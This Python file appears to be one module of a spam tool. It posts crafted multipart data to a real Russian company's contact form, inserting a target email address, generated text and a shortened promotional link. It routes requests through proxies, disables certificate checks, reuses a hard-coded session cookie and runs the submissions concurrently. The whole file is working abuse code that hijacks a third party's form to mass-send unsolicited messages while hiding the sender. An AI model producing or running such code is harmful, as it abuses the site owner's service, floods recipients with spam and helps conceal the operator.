import requests

from module.spam_abstraction import Spam

headers = {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydOKhAeG3cR7O4Z0S',
    'Cookie': 'PHPSESSID=a85bed72690ac908e8aaa419816c6a76',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:

        data = '------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[fos_no]"\r\n\r\n1\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[attrib][pole2][pole]"\r\n\r\ntest\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[attrib][pole3][pole]"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[attrib][pole4][pole]"\r\n\r\ntest\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[attrib][pole6][pole]"\r\n\r\ntest\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[send_me]"\r\n\r\n0\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="FosForm[send_me]"\r\n\r\n1\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S\r\nContent-Disposition: form-data; name="95kPs-VngNJQm_YT#nw8CcNcR7P#Ynp"\r\n\r\n\r\n------WebKitFormBoundarydOKhAeG3cR7O4Z0S--\r\n'
        data = data.replace('softumwork@gmail.com', target)
        data = data.replace('test', self.get_text(False).encode().decode('latin-1'))

        response = requests.post('http://www.eurokam-ural.ru/ostavit_soobschenie', headers=headers,
                                 data=data, verify=False, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    success_message = 'Спасибо за обращение!'
    project_name = 'eurokam'
    promo_link = 'bit.ly/3EKP3gz'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
